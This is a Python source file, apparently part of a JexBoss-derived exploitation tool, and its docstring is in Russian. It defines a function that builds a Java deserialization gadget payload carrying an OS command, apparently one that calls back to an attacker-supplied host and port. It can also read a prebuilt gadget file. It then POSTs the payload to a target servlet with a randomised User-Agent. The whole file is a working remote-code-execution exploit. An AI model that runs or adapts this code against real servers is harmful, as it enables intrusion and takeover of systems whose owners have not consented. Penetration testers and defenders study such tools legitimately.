from src.utils.colors import Colors
from src.utils.http_helpers import get_payload_gadget
from src.utils.misc import print_and_flush, generate_cmd_for_runtime_exec, get_random_user_agent


def exploit_servlet_deserialization(
        url: str,
        host: str,
        port: int,
        cmd: str,
        is_win: bool,
        gadget: str,
        gadget_file: str | None
) -> int:
    """
    Эксплуатирует Java десериализацию в универсальных сервлетах (JAX-RS и др.), используя заданный gadget или бинарный файл.
    """
    if gadget_file is None:
        cmd = generate_cmd_for_runtime_exec(cmd, host, port, is_win)
        payload = get_payload_gadget(gadget_type=gadget, cmd=cmd)
    else:
        try:
            with open(gadget_file, "rb") as f:
                payload = f.read()
        except FileNotFoundError:
            print_and_flush(
                f"{Colors.RED}\n * The \"{gadget_file}\" file could not be found."
                " Ensure the filename is correct or let the tool generate the payload.{Colors.ENDC}"
            )
            return 505

    headers = {
        "Content-Type": "application/x-java-serialized-object; class=github.com/joaomatosf/jexboss",
        "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
        "Connection": "keep-alive",
        "User-Agent": get_random_user_agent()
    }
    response = gl_http_pool.urlopen("POST", url, redirect=False, headers=headers, body=payload)
    return 201 if response.status == 200 else response.status
